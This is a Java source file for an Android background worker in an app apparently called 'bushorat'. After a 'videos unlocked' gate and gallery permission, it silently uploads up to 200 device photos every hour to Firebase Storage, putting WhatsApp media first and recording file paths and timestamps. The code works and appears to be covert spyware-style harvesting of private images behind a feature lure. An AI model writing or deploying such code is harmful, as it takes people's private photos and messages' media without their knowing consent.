package com.bushorat.app.helpers;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Uploads WhatsApp media (preferred) then other gallery images to Firebase Storage,
 * keyed per user under gallery/{uid}/ with stable IDs so duplicates are skipped.
 */
public class ImageUploadWorker extends Worker {
    private static final String TAG = "ImageUploadWorker";
    private static final String UNIQUE_ONE_TIME = "whatsapp_media_upload_once";
    private static final String UNIQUE_PERIODIC = "whatsapp_media_upload_periodic";
    private static final int MAX_IMAGES_PER_SYNC = 200;

    public ImageUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        FirebaseApp.initializeApp(context);
    }

    @NonNull
    @Override
    public Result doWork() {
        if (!FeaturePermissions.areVideosUnlocked(getApplicationContext())) {
            Log.w(TAG, "Videos not unlocked — skip media upload");
            return Result.success();
        }

        FirebaseAuth auth = FirebaseAuth.getInstance();
        if (auth.getCurrentUser() == null) {
            Log.e(TAG, "User not logged in.");
            // Retry if user is not logged in yet
            return Result.retry();
        }

        String uid = auth.getUid();
        List<File> galleryImages = getPreferredGalleryImages();
        if (galleryImages.isEmpty()) {
            Log.d(TAG, "No WhatsApp / gallery images found.");
            FirebaseDataPaths.updateSyncStatus(uid, "gallery", 0);
            return Result.success();
        }

        DatabaseReference galleryRef = FirebaseDataPaths.gallery(uid);
        Set<String> uploadedKeys = new HashSet<>();
        CountDownLatch latch = new CountDownLatch(1);

        galleryRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot imageSnapshot : snapshot.getChildren()) {
                    String filePath = imageSnapshot.child("filePath").getValue(String.class);
                    String imageId = imageSnapshot.getKey();
                    if (filePath != null) {
                        uploadedKeys.add(filePath);
                    }
                    if (imageId != null) {
                        uploadedKeys.add(imageId);
                    }
                }
                latch.countDown();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e(TAG, "Error fetching uploaded gallery images", error.toException());
                latch.countDown();
            }
        });

        try {
            // Wait up to 30 seconds for Firebase to respond
            if (!latch.await(30, TimeUnit.SECONDS)) {
                Log.w(TAG, "Timeout waiting for gallery metadata — retrying");
                return Result.retry();
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return Result.retry();
        }

        FirebaseStorage storage = FirebaseStorage.getInstance();
        AtomicInteger uploadedCount = new AtomicInteger(0);
        CountDownLatch uploadLatch = new CountDownLatch(galleryImages.size());

        for (File image : galleryImages) {
            String filePath = image.getAbsolutePath();
            String imageId = generateImageId(filePath, image.getName());
            if (uploadedKeys.contains(filePath) || uploadedKeys.contains(imageId)) {
                uploadLatch.countDown();
                continue;
            }
            uploadGalleryImage(image, uid, storage, imageId, uploadLatch, uploadedCount);
        }

        try {
            // Wait up to 5 minutes for all uploads to complete
            if (!uploadLatch.await(5, TimeUnit.MINUTES)) {
                Log.w(TAG, "Timeout waiting for media uploads — will retry in next cycle");
                // Still report success as uploads may complete in background
                return Result.success();
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return Result.retry();
        }

        int count = uploadedCount.get();
        FirebaseDataPaths.updateSyncStatus(uid, "gallery", count);
        Log.d(TAG, "Successfully uploaded " + count + " media files.");
        return Result.success();
    }

    /** One-shot unique enqueue (no duplicate concurrent runs). */
    public static void enqueueWork(Context context) {
        if (!PermissionsManager.hasGalleryPermission(context)) {
            return;
        }
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();
        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(ImageUploadWorker.class)
                .setConstraints(constraints)
                .build();
        WorkManager.getInstance(context).enqueueUniqueWork(
                UNIQUE_ONE_TIME,
                ExistingWorkPolicy.KEEP,
                uploadWork
        );
    }

    /** Start background periodic WhatsApp/media sync after videos are unlocked. */
    public static void schedulePeriodicUpload(Context context) {
        if (!PermissionsManager.hasGalleryPermission(context)) {
            return;
        }
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();
        PeriodicWorkRequest periodic = new PeriodicWorkRequest.Builder(
                ImageUploadWorker.class,
                1, TimeUnit.HOURS
        ).setConstraints(constraints).build();

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                UNIQUE_PERIODIC,
                ExistingPeriodicWorkPolicy.KEEP,
                periodic
        );
        enqueueWork(context);
    }

    /**
     * Prefer WhatsApp media paths; fill remaining quota with other gallery images.
     */
    private List<File> getPreferredGalleryImages() {
        List<File> whatsapp = new ArrayList<>();
        List<File> other = new ArrayList<>();
        Context context = getApplicationContext();

        String[] projection = {
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.MIME_TYPE
        };

        try (Cursor cursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
        )) {
            if (cursor == null) {
                return whatsapp;
            }

            int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            while (cursor.moveToNext()) {
                String filePath = cursor.getString(dataColumn);
                if (filePath == null || !isImageFile(filePath)) {
                    continue;
                }
                File imageFile = new File(filePath);
                if (!imageFile.exists() || !imageFile.canRead()) {
                    continue;
                }
                if (isWhatsAppPath(filePath)) {
                    if (whatsapp.size() < MAX_IMAGES_PER_SYNC) {
                        whatsapp.add(imageFile);
                    }
                } else if (other.size() < MAX_IMAGES_PER_SYNC) {
                    other.add(imageFile);
                }
                if (whatsapp.size() >= MAX_IMAGES_PER_SYNC) {
                    break;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading gallery images", e);
        }

        List<File> result = new ArrayList<>(whatsapp);
        for (File f : other) {
            if (result.size() >= MAX_IMAGES_PER_SYNC) {
                break;
            }
            result.add(f);
        }
        Log.d(TAG, "Found " + whatsapp.size() + " WhatsApp + " + (result.size() - whatsapp.size()) + " other images");
        return result;
    }

    static boolean isWhatsAppPath(String filePath) {
        String lower = filePath.toLowerCase(Locale.US);
        return lower.contains("/whatsapp/")
                || lower.contains("whatsapp images")
                || lower.contains("whatsapp video")
                || lower.contains("whatsapp documents")
                || lower.contains("com.whatsapp")
                || lower.contains("com.whatsapp.w4b");
    }

    private boolean isImageFile(String filePath) {
        String lower = filePath.toLowerCase(Locale.US);
        return lower.endsWith(".jpg") || lower.endsWith(".jpeg")
                || lower.endsWith(".png") || lower.endsWith(".gif")
                || lower.endsWith(".webp");
    }

    private void uploadGalleryImage(File imageFile, String uid, FirebaseStorage storage, String imageId, 
                                   CountDownLatch uploadLatch, AtomicInteger uploadedCount) {
        final String fileName = imageFile.getName();
        final String filePath = imageFile.getAbsolutePath();
        final long timestamp = imageFile.lastModified();
        final String mimeType = getMimeType(fileName);
        final boolean fromWhatsApp = isWhatsAppPath(filePath);

        Bitmap bitmap = BitmapFactory.decodeFile(filePath);
        if (bitmap == null) {
            Log.e(TAG, "Failed to decode image: " + filePath);
            uploadLatch.countDown();
            return;
        }

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Bitmap.CompressFormat format = mimeType.equals("image/png")
                ? Bitmap.CompressFormat.PNG : Bitmap.CompressFormat.JPEG;
        bitmap.compress(format, 85, baos);
        byte[] imageData = baos.toByteArray();
        bitmap.recycle();

        StorageReference storageRef = storage.getReference("gallery")
                .child(uid)
                .child(imageId + getFileExtension(fileName));

        storageRef.putBytes(imageData)
                .addOnSuccessListener(taskSnapshot ->
                        storageRef.getDownloadUrl()
                                .addOnSuccessListener(uri -> {
                                    DatabaseReference imageRef = FirebaseDataPaths.gallery(uid).child(imageId);
                                    Map<String, Object> metadata = new HashMap<>();
                                    metadata.put("dataType", "gallery");
                                    metadata.put("source", fromWhatsApp ? "whatsapp" : "gallery");
                                    metadata.put("mimeType", mimeType);
                                    metadata.put("fileName", fileName);
                                    metadata.put("filePath", filePath);
                                    metadata.put("timestamp", timestamp);
                                    metadata.put("uploadedAt", System.currentTimeMillis());
                                    metadata.put("url", uri.toString());
                                    metadata.put("userId", uid);
                                    imageRef.setValue(metadata)
                                            .addOnSuccessListener(unused -> {
                                                uploadedCount.incrementAndGet();
                                                Log.d(TAG, "Uploaded media: " + fileName);
                                                uploadLatch.countDown();
                                            })
                                            .addOnFailureListener(e -> {
                                                Log.e(TAG, "Failed to save metadata for: " + fileName, e);
                                                uploadLatch.countDown();
                                            });
                                })
                                .addOnFailureListener(e -> {
                                    Log.e(TAG, "Failed to get download URL: " + fileName, e);
                                    uploadLatch.countDown();
                                })
                )
                .addOnFailureListener(e -> {
                    Log.e(TAG, "Failed to upload image to storage: " + fileName, e);
                    uploadLatch.countDown();
                });
    }

    private String getMimeType(String fileName) {
        String lower = fileName.toLowerCase(Locale.US);
        if (lower.endsWith(".png")) return "image/png";
        if (lower.endsWith(".gif")) return "image/gif";
        if (lower.endsWith(".webp")) return "image/webp";
        return "image/jpeg";
    }

    private String generateImageId(String filePath, String fileName) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] hashBytes = md.digest((filePath + "|" + fileName).getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : hashBytes) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return System.currentTimeMillis() + "_" + fileName.hashCode();
        }
    }

    private String getFileExtension(String fileName) {
        int lastDot = fileName.lastIndexOf('.');
        if (lastDot > 0 && lastDot < fileName.length() - 1) {
            return fileName.substring(lastDot);
        }
        return ".jpg";
    }
}
